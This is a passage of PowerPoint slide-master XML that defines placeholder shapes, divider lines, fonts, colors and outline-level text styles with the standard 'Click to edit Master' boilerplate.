          <a:xfrm>
            <a:off x="761760" y="3124080"/>
            <a:ext cx="7772400" cy="360"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="808080"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="81" name="PlaceHolder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1197000"/>
            <a:ext cx="7772040" cy="1469520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="12600">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr numCol="1" spcCol="0" anchor="ctr">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="bc4b2c"/>
                </a:solidFill>
                <a:latin typeface="Georgia"/>
              </a:rPr>
              <a:t>Click to edit Master title style</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="82" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="6245280"/>
            <a:ext cx="2133360" cy="475920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr numCol="1" spcCol="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83" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3124080" y="6245280"/>
            <a:ext cx="2895120" cy="475920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr numCol="1" spcCol="0" anchor="t">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84" name="PlaceHolder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="3"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6553080" y="6245280"/>
            <a:ext cx="2133360" cy="475920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr numCol="1" spcCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr algn="r">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr b="0" lang="en-US" sz="1400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr algn="r">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:fld id="{182D2C7F-4EB6-4A85-BE7F-1CF943123FD7}" type="slidenum">
              <a:rPr b="0" lang="en-US" sz="1400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
              </a:rPr>
              <a:t>&lt;number&gt;</a:t>
            </a:fld>
            <a:endParaRPr b="0" lang="en-US" sz="1400" spc="-1" strike="noStrike">
              <a:latin typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="85"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105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1417"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="000000"/>
              </a:buClr>
              <a:buSzPct val="45000"/>
              <a:buFont typeface="Wingdings" charset="2"/>
              <a:buChar char=""/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Click to edit the outline text format</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="864000" indent="-324000">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1134"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="000000"/>
              </a:buClr>
              <a:buSzPct val="75000"/>
              <a:buFont typeface="Symbol" charset="2"/>
              <a:buChar char=""/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Second Outline Level</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="2" marL="1296000" indent="-288000">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="850"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="000000"/>
              </a:buClr>
              <a:buSzPct val="45000"/>
              <a:buFont typeface="Wingdings" charset="2"/>
              <a:buChar char=""/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Third Outline Level</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="3" marL="1728000" indent="-216000">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="567"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="000000"/>
              </a:buClr>
              <a:buSzPct val="75000"/>
              <a:buFont typeface="Symbol" charset="2"/>
              <a:buChar char=""/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1600" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Fourth Outline Level</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1600" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="4" marL="2160000" indent="-216000">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="283"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="000000"/>
              </a:buClr>
              <a:buSzPct val="45000"/>
              <a:buFont typeface="Wingdings" charset="2"/>
              <a:buChar char=""/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Fifth Outline Level</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="5" marL="2592000" indent="-216000">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="283"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="000000"/>
              </a:buClr>
              <a:buSzPct val="45000"/>
              <a:buFont typeface="Wingdings" charset="2"/>
              <a:buChar char=""/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Sixth Outline Level</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="6" marL="3024000" indent="-216000">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="283"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="000000"/>
              </a:buClr>
              <a:buSzPct val="45000"/>
              <a:buFont typeface="Wingdings" charset="2"/>
              <a:buChar char=""/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Seventh Outline Level</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>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Line 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1600200"/>
            <a:ext cx="7772400" cy="360"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="25560">
            <a:solidFill>
              <a:srgbClr val="808080"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1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4"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Line 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1600200"/>
            <a:ext cx="7772400" cy="360"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="808080"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="162"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Click to edit Master title style</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="163" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body"/>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Click to edit Master text styles</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Second level</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2200" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="2" marL="1143000" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Third level</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="3" marL="1600200" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="360"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Fourth level</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="4" marL="2057400" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="320"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1600" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Fifth level</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1600" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="164" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" idx="4"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="6248520"/>
            <a:ext cx="1904760" cy="456840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr numCol="1" spcCol="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165" name="PlaceHolder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3124080" y="6248520"/>
            <a:ext cx="2895120" cy="456840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr numCol="1" spcCol="0" anchor="t">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166" name="PlaceHolder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="6"/>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000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr algn="r">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:fld id="{A4FBD4A1-6CDC-4C08-BE42-73BD53D19A71}" type="slidenum">
              <a:rPr b="0" lang="en-US" sz="1400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>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3" name="Line 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1600200"/>
            <a:ext cx="7772400" cy="360"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="808080"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="204"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Click to edit Master title style</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="205" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1752480"/>
            <a:ext cx="3809520" cy="4343040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr numCol="1" spcCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:pPr marL="343080" indent="-343080">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="561"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Click to edit Master text styles</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2800" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="743040" indent="-285840">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="479"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Second level</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="2" marL="1143000" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Third level</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="3" marL="1600200" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="360"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Fourth level</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="4" marL="2057400" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="360"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Fifth level</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="206" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4648320" y="1752480"/>
            <a:ext cx="3809520" cy="4343040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr numCol="1" spcCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:pPr marL="343080" indent="-343080">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="561"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Click to edit Master text styles</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2800" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="743040" indent="-285840">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="479"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Second level</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="2" marL="1143000" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Third level</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="3" marL="1600200" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="360"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Fourth level</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="4" marL="2057400" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="360"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Fifth level</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="207" name="PlaceHolder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" idx="7"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="6248520"/>
            <a:ext cx="1904760" cy="456840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr numCol="1" spcCol="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208" name="PlaceHolder 5"/>
